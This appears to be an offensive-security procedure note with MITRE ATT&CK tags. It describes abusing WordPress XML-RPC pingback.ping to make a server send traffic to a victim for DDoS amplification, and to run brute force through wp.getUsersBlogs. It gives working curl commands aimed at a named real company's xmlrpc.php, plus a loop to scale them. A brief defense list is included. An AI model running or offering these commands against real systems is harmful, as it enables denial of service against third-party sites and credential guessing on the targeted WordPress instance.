---
tags:
  - ddos
  - xmlrpc
  - wordpress
  - amplification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/trigger-pingback-ping]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:26:56.552Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 56e298d4-9488-4669-a10e-e953b3d2fc6d
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Brute Force]]'
---
# Demonstrate-DDoS-via-Pingback-ping

## Summary

This procedure exploits the pingback.ping XML-RPC method to force the WordPress server to send outbound HTTP requests to a victim target, demonstrating DDoS amplification potential; it also illustrates scalability for brute force attacks on credentials.

## Description

The pingback.ping method, when enabled via xmlrpc.php, allows attackers to specify a source (attacker-controlled) and target URL, causing the server to fetch the target and potentially the source, amplifying traffic. On sites like NordVPN's WordPress instance, this can be abused in botnets for DDoS or repeated for brute forcing via other methods like wp.getUsersBlogs. Prerequisites include a verified active endpoint from prior reconnaissance.

## Requirements

1. Confirmed active xmlrpc.php from previous verification
2. Control over a source server to monitor requests (e.g., ngrok or local web server)
3. Victim URL for testing (use a controlled site to avoid real harm)
4. Ability to scale requests if demonstrating amplification

## Defense

Defensive measures and detection strategies:

- Block or disable pingback.ping via XML-RPC plugins or server config
- Implement outbound request filtering and rate limiting on WAF (e.g., Cloudflare rules for xmlrpc.php)
- Monitor server logs for unexpected HTTP GETs triggered by XML-RPC calls

## Objectives

1. Trigger server-side outbound request to victim
2. Demonstrate traffic amplification for DDoS
3. Highlight brute force risks through method abuse

## Instructions

### Step 1: Prepare Payload and Send pingback.ping

**Context**: Construct XML payload with source (your server) and target (victim) URLs to initiate the pingback.

**Command** ([[commands/trigger-pingback-ping]]):
```bash
curl -X POST https://nordvpn.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://your-server.com/payload.xml</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>' -v
```

> Replace URLs accordingly. Expected output: XML fault or success; verify by checking victim logs for incoming GET from NordVPN's IP.

### Step 2: Scale for Amplification or Brute Force

**Context**: Repeat the request multiple times or script it to simulate DDoS; adapt for brute force by changing method to credential-testing ones.

**Command** (loop example):
```bash
for i in {1..10}; do curl -X POST https://nordvpn.com/xmlrpc.php -H "Content-Type: text/xml" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://your-server.com</string></value></param><param><value><string>https://victim-site.com</string></value></param></params></methodCall>'; done
```

> This loops 10 requests. Monitor amplification ratio (server request size vs. response). For brute force, swap methodName to wp.getUsersBlogs with guessed credentials.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Brute Force]] Brute Force

### Sub-Techniques


## Commands Used

- [[commands/trigger-pingback-ping]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- ddos
- amplification
- brute-force
